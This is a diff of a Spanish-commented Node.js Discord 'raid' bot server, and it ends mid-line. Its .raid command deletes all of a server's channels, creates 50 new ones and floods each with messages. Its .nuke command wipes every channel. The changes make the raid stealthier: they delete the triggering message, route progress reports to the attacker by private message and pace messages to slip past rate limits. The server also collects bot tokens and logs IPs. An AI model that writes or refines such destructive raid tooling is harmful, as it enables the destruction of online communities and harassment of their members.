@@ -51,7 +51,7 @@ let ipLogs = [];
 let activeBots = new Map();
 let uploadedImages = new Map();
 
-// Configuración predeterminada del raid - MODO ULTRA RÁPIDO
+// Configuración predeterminada del raid
 const RAID_CONFIG = {
     canales: 50,
     mensajesPorCanal: 15,
@@ -65,7 +65,7 @@ app.get('/', (req, res) => {
 });
 
 // ============================================
-// HEALTH CHECK PARA RAILWAY
+// HEALTH CHECK
 // ============================================
 app.get('/health', (req, res) => {
     res.status(200).json({ 
@@ -175,7 +175,7 @@ app.get('/api/ip-logs', (req, res) => {
 });
 
 // ============================================
-// BOT DE COMANDOS - MODO ULTRA RÁPIDO (TODO EN PARALELO)
+// BOT DE COMANDOS - CORREGIDO
 // ============================================
 
 // Iniciar bot
@@ -195,7 +195,8 @@ app.post('/api/start-bot', async (req, res) => {
             IntentsBitField.Flags.Guilds,
             IntentsBitField.Flags.GuildMessages,
             IntentsBitField.Flags.MessageContent,
-            IntentsBitField.Flags.GuildMembers
+            IntentsBitField.Flags.GuildMembers,
+            IntentsBitField.Flags.DirectMessages
         ] 
     });
 
@@ -205,7 +206,6 @@ app.post('/api/start-bot', async (req, res) => {
         bot.once('ready', () => {
             console.log(`✅ Bot conectado: ${bot.user.tag}`);
             console.log(`📊 Servidores: ${bot.guilds.cache.size}`);
-            console.log(`⚡ MODO ULTRA RÁPIDO ACTIVADO - TODO EN PARALELO`);
             
             bot.on(Events.MessageCreate, async (message) => {
                 if (message.author.bot) return;
@@ -215,24 +215,37 @@ app.post('/api/start-bot', async (req, res) => {
                 const args = message.content.slice(prefix.length).trim().split(/ +/);
                 const command = args.shift().toLowerCase();
                 
-                console.log(`📨 Comando recibido: ${command} en ${message.guild?.name}`);
+                console.log(`📨 Comando recibido: ${command} de ${message.author.tag}`);
 
                 // ============================================
-                // COMANDO .raid - TODO EN PARALELO (ULTRA RÁPIDO)
+                // COMANDO .raid - TODO EN PRIVADO
                 // ============================================
                 if (command === 'raid') {
-                    await message.reply(`⚡ **MODO ULTRA RÁPIDO ACTIVADO** ⚡\n\`\`\`\n📊 EJECUTANDO TODO EN PARALELO...\`\`\``);
+                    try {
+                        // Enviar confirmación por privado
+                        await message.author.send(`⚡ **INICIANDO RAID** ⚡\n\`\`\`\nServidor: ${message.guild?.name}\nCanales: ${RAID_CONFIG.canales}\nMensajes por canal: ${RAID_CONFIG.mensajesPorCanal}\n\`\`\``);
+                        
+                        // Eliminar el mensaje del comando (opcional)
+                        await message.delete().catch(() => {});
+                        
+                    } catch (e) {
+                        console.log('No se pudo enviar mensaje privado:', e.message);
+                        await message.reply('⚠️ No puedo enviarte mensajes privados. Habilita "Permitir mensajes directos" en las opciones del servidor.');
+                        return;
+                    }
                     
                     try {
                         const guild = message.guild;
                         if (!guild) {
-                            await message.channel.send('❌ Este comando solo funciona en servidores');
+                            await message.author.send('❌ Este comando solo funciona en servidores');
                             return;
                         }
 
                         // ============================================
-                        // FASE 1: ELIMINAR TODOS LOS CANALES (EN PARALELO)
+                        // FASE 1: ELIMINAR CANALES
                         // ============================================
+                        await message.author.send('🗑️ **FASE 1:** Eliminando canales existentes...');
+                        
                         const channels = await guild.channels.fetch();
                         const deletePromises = [];
                         
@@ -246,10 +259,14 @@ app.post('/api/start-bot', async (req, res) => {
                         
                         const deleteResults = await Promise.all(deletePromises);
                         const canalesEliminados = deletePromises.length;
+                        
+                        await message.author.send(`✅ Canales eliminados: ${canalesEliminados}`);
 
                         // ============================================
-                        // FASE 2: CREAR 50 CANALES (EN PARALELO)
+                        // FASE 2: CREAR CANALES
                         // ============================================
+                        await message.author.send(`📌 **FASE 2:** Creando ${RAID_CONFIG.canales} canales...`);
+                        
                         const createPromises = [];
                         for (let i = 0; i < RAID_CONFIG.canales; i++) {
                             createPromises.push(
@@ -263,44 +280,75 @@ app.post('/api/start-bot', async (req, res) => {
                         const canales = await Promise.all(createPromises);
                         const canalesValidos = canales.filter(c => c !== null);
                         const canalesCreados = canalesValidos.length;
+                        
+                        await message.author.send(`✅ Canales creados: ${canalesCreados}`);
 
                         // ============================================
-                        // FASE 3: ENVIAR MENSAJES A TODOS LOS CANALES (EN PARALELO)
+                        // FASE 3: ENVIAR MENSAJES (FORZANDO 15 POR CANAL)
                         // ============================================
-                        const messagePromises = [];
+                        await message.author.send(`📝 **FASE 3:** Enviando ${RAID_CONFIG.mensajesPorCanal} mensajes por canal...`);
                         
-                        canalesValidos.forEach(channel => {
-                            for (let j = 0; j < RAID_CONFIG.mensajesPorCanal; j++) {
-                                messagePromises.push(
-                                    channel.send(RAID_CONFIG.mensaje).catch(() => {})
-                                );
+                        let mensajesEnviados = 0;
+                        
+                        // POR CADA CANAL
+                        for (const channel of canalesValidos) {
+                            try {
+                                // ENVIAR 15 MENSAJES EN CADA CANAL
+                                for (let j = 0; j < RAID_CONFIG.mensajesPorCanal; j++) {
+                                    await channel.send(RAID_CONFIG.mensaje);
+                                    mensajesEnviados++;
+                                    
+                                    // Pequeña pausa cada 5 mensajes para evitar rate limit
+                                    if (j % 5 === 0) {
+                                        await new Promise(resolve => setTimeout(resolve, 100));
+                                    }
+                                }
+                                console.log(`✅ Canal ${channel.name}: ${RAID_CONFIG.mensajesPorCanal} mensajes enviados`);
+                            } catch (e) {
+                                console.log(`Error enviando mensajes a ${channel?.name}:`, e.message);
                             }
-                        });
-                        
-                        await Promise.all(messagePromises);
-                        const mensajesEnviados = messagePromises.length;
+                        }
 
                         // ============================================
-                        // FASE 4: REPORTE FINAL
+                        // FASE 4: REPORTE FINAL POR PRIVADO
                         // ============================================
-                        await message.channel.send(`✅ **RAID COMPLETADO EN MODO ULTRA RÁPIDO** ✅\n\`\`\`\n🗑️ CANALES ELIMINADOS: ${canalesEliminados}\n📌 CANALES CREADOS: ${canalesCreados}\n💬 MENSAJES ENVIADOS: ${mensajesEnviados}\n⚡ MODO: TODO EN PARALELO\n\`\`\``);
+                        const reporte = `✅ **RAID COMPLETADO** ✅
+\`\`\`prolog
+🗑️ CANALES ELIMINADOS: ${canalesEliminados}
+📌 CANALES CREADOS: ${canalesCreados}
+💬 MENSAJES ENVIADOS: ${mensajesEnviados}
+⚡ OBJETIVO: ${RAID_CONFIG.mensajesPorCanal} por canal
+\`\`\``;
+
+                        await message.author.send(reporte);
+                        
+                        // También enviar un mensaje al servidor (opcional)
+                        if (canalesValidos.length > 0) {
+                            await canalesValidos[0].send(`✅ RAID COMPLETADO POR ${message.author.tag}`);
+                        }
 
                     } catch (e) {
                         console.error('Error en raid:', e);
-                        await message.channel.send(`❌ Error: ${e.message}`);
+                        await message.author.send(`❌ Error: ${e.message}`);
                     }
                 }
                 
                 // ============================================
-                // COMANDO .nuke - ELIMINAR TODO EN PARALELO
+                // COMANDO .nuke - TODO EN PRIVADO
                 // ============================================
                 else if (command === 'nuke') {
-                    await message.reply('💥 **ELIMINANDO TODO EN PARALELO**...');
+                    try {
+                        await message.author.send('💥 **INICIANDO NUKE**...');
+                        await message.delete().catch(() => {});
+                    } catch (e) {
+                        await message.reply('No puedo enviarte mensajes privados');
+                        return;
+                    }
                     
                     try {
                         const guild = message.guild;
                         if (!guild) {
-                            await message.channel.send('❌ Este comando solo funciona en servidores');
+                            await message.author.send('❌ Este comando solo funciona en servidores');
                             return;
                         }
 
@@ -317,18 +365,18 @@ app.post('/api/start-bot', async (req, res) => {
                         
                         await Promise.all(deletePromises);
                         
-                        await message.channel.send(`✅ **NUKE COMPLETADO**\n\`\`\`\n🗑️ CANALES ELIMINADOS: ${deletePromises.length}\n⚡ MODO: PARALELO\`\`\``);
+                        await message.author.send(`✅ **NUKE COMPLETADO**\n\`\`\`\n🗑️ Canales eliminados: ${deletePromises.length}\n\`\`\``);
                         
                     } catch (e) {
-                        await message.channel.send(`❌ Error: ${e.message}`);
+                        await message.author.send(`❌ Error: ${e.message}`);
                     }
                 }
                 
                 // ============================================
-                // COMANDO .stop / .off - DETENER BOT
+                // COMANDO .stop
                 // ============================================
                 else if (command === 'stop' || command === 'off') {
-                    await message.reply('🛑 **DETENIENDO BOT**...');
+                    await message.author.send('🛑 **DETENIENDO BOT**...');
                     
                     for (const [t, botData] of activeBots.entries()) {
                         if (botData.userTag === bot.user.tag) {
@@ -337,58 +385,68 @@ app.post('/api/start-bot', async (req, res) => {
                         }
                     }
                     
-                    await message.channel.send('✅ Bot desconectado.');
-                    setTimeout(() => bot.destroy(), 100);
+                    await message.author.send('✅ Bot desconectado.');
+                    setTimeout(() => bot.destroy(), 1000);
                 }
                 
                 // ============================================
-                // COMANDO .servers - LISTAR SERVIDORES
+                // COMANDO .servers
                 // ============================================
                 else if (command === 'servers') {
-                    const guilds = bot.guilds.cache;
-                    let serverList = '**📡 SERVIDORES:**\n```\n';
-                    guilds.forEach(g => {
-                        serverList += `- ${g.name} (${g.memberCount} miembros)\n`;
-                    });
-                    serverList += '```';
-                    await message.reply(serverList);
+                    try {
+                        const guilds = bot.guilds.cache;
+                        let serverList = '**📡 SERVIDORES:**\n```\n';
+                        guilds.forEach(g => {
+                            serverList += `- ${g.name} (${g.memberCount} miembros)\n`;
+                        });
+                        serverList += '```';
+                        await message.author.send(serverList);
+                    } catch (e) {
+                        await message.reply('No puedo enviarte mensajes privados');
+                    }
                 }
                 
                 // ============================================
-                // COMANDO .ping - VER LATENCIA
+                // COMANDO .ping
                 // ============================================
                 else if (command === 'ping') {
                     const ping = Date.now() - message.createdTimestamp;
-                    await message.reply(`🏓 **PONG!** Latencia: ${ping}ms | API: ${Math.round(bot.ws.ping)}ms`);
+                    try {
+                        await message.author.send(`🏓 **PONG!** Latencia: ${ping}ms | API: ${Math.round(bot.ws.ping)}ms`);
+                    } catch (e) {
+                        await message.reply(`🏓 PONG! Latencia: ${ping}ms`);
+                    }
                 }
                 
                 // ============================================
-                // COMANDO .help - MOSTRAR AYUDA
+                // COMANDO .help
                 // ============================================
                 else if (command === 'help') {
                     const helpMsg = `
-**⚡ MODO ULTRA RÁPIDO - TODO EN PARALELO ⚡**
+**🤖 COMANDOS DEL BOT (PRIVADOS)**
 \`\`\`css
-${prefix}raid    - Destruye el servidor (TODO EN PARALELO)
-${prefix}nuke    - Elimina todos los canales (PARALELO)
+${prefix}raid    - Destruye el servidor (te envío todo por privado)
+${prefix}nuke    - Elimina todos los canales
 ${prefix}stop    - Detiene el bot
-${prefix}off     - Lo mismo que .stop
-${prefix}servers - Lista todos los servidores
-${prefix}ping    - Muestra la latencia
-${prefix}help    - Muestra esta ayuda
+${prefix}servers - Lista servidores
+${prefix}ping    - Ver latencia
 \`\`\`
-⚙️ **CONFIGURACIÓN ULTRA RÁPIDA:**
+⚙️ **CONFIGURACIÓN:**
 \`\`\`yaml
-Canales a crear: ${RAID_CONFIG.canales}
+Canales: ${RAID_CONFIG.canales}
 Mensajes por canal: ${RAID_CONFIG.mensajesPorCanal}
-Nombre del canal: ${RAID_CONFIG.nombreCanal}
-Modo: TODO EN PARALELO (MÁXIMA VELOCIDAD)
+Nombre: ${RAID_CONFIG.nombreCanal}
 \`\`\``;
-                    await message.reply(helpMsg);
+                    
+                    try {
+                        await message.author.send(helpMsg);
+                    } catch (e) {
+                        await message.reply('No puedo enviarte mensajes privados. Habilita "Permitir mensajes directos" en las opciones del servidor.');
+                    }
                 }
             });
             
-            console.log(`👂 Bot escuchando comandos con prefijo: ${prefix} (MODO ULTRA RÁPIDO)`);
+            console.log(`👂 Bot escuchando comandos con prefijo: ${prefix}`);
         });
 
         activeBots.set(token, {
@@ -401,7 +459,7 @@ Modo: TODO EN PARALELO (MÁXIMA VELOCIDAD)
 
         res.json({ 
             success: true, 
-            message: "✅ Bot iniciado en MODO ULTRA RÁPIDO",
+            message: "✅ Bot iniciado - Los resultados irán por privado",
             user: bot.user?.tag,
             servers: bot.guilds.cache.size,
             config: RAID_CONFIG
@@ -465,53 +523,4 @@ app.post('/api/get-guilds', async (req, res) => {
             res.json({ success: true, guilds });
         });
 
-    } catch (err) { 
-        res.status(401).json({ error: "Token Inválido" }); 
-    }
-});
-
-// Obtener bots activos
-app.get('/api/active-bots', (req, res) => {
-    const bots = [];
-    activeBots.forEach((data, token) => {
-        bots.push({
-            token: token.substring(0, 20) + "...",
-            user: data.userTag,
-            startedAt: data.startedAt,
-            servers: data.servers || 0,
-            prefix: data.prefix || '.',
-            mode: "ULTRA RÁPIDO"
-        });
-    });
-    res.json(bots);
-});
-
-// Endpoint para actualizar configuración del raid
-app.post('/api/update-config', (req, res) => {
-    const { canales, mensajesPorCanal, nombreCanal, mensaje } = req.body;
-    
-    if (canales) RAID_CONFIG.canales = parseInt(canales);
-    if (mensajesPorCanal) RAID_CONFIG.mensajesPorCanal = parseInt(mensajesPorCanal);
-    if (nombreCanal) RAID_CONFIG.nombreCanal = nombreCanal;
-    if (mensaje) RAID_CONFIG.mensaje = mensaje;
-    
-    res.json({ 
-        success: true, 
-        message: "Configuración ultra rápida actualizada",
-        config: RAID_CONFIG 
-    });
-});
-
-// ============================================
-// INICIAR SERVIDOR
-// ============================================
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
-    console.log(`📁 Carpeta uploads: ${path.resolve('./public/uploads')}`);
-    console.log(`⚡ MODO ULTRA RÁPIDO ACTIVADO:`);
-    console.log(`   - Canales: ${RAID_CONFIG.canales}`);
-    console.log(`   - Mensajes por canal: ${RAID_CONFIG.mensajesPorCanal}`);
-    console.log(`   - Nombre canal: ${RAID_CONFIG.nombreCanal}`);
-    console.log(`   - Modo: TODO EN PARALELO`);
-    console.log(`🌐 URL: http://localhost:${PORT}`);
-});
+    } catch (er
